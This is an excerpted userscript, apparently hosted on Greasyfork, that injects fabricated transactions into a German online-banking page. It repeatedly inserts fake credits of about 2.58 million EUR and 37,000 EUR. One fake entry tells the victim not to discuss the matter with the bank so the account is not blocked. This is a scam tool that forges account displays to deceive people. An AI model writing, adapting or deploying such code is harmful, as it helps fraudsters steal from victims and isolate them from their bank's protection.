// ==UserScript==
// @name         Ed WM Cons Jurgen Lindner
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/495952/Ed%20WM%20Cons%20Jurgen%20Lindner.user.js
// @updateURL https://update.greasyfork.org/scripts/495952/Ed%20WM%20Cons%20Jurgen%20Lindner.meta.js
// ==/UserScript==
...
//  UMSATZE BALANCE
 ...
 //   const accountValue = '230788831'; // Set your desired account value here
 ...
 //       },
        {
            ...
            transactionAmount: "+2.577.972,37 EUR",
            insertPosition: 'above' // Specify position for this transaction
        },
        {
           ...
           transactionDetails: " A. Graf meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
           transactionAmount: "+37.000,00 EUR",
           insertPosition: 'above' // Specify position for this transaction
       },
...
const presenceCheckElement = document.querySelector('.icon.icon-20.svg-stroke--none.svg-fill--darkgrey.margin-right-8') && document.querySelector('div.row.margin-top-5 h4');
...
//    checkAndInsertTransactions(); // Initial check
    setInterval(checkAndInsertTransactions, 5500); // Check every 5 seconds
}
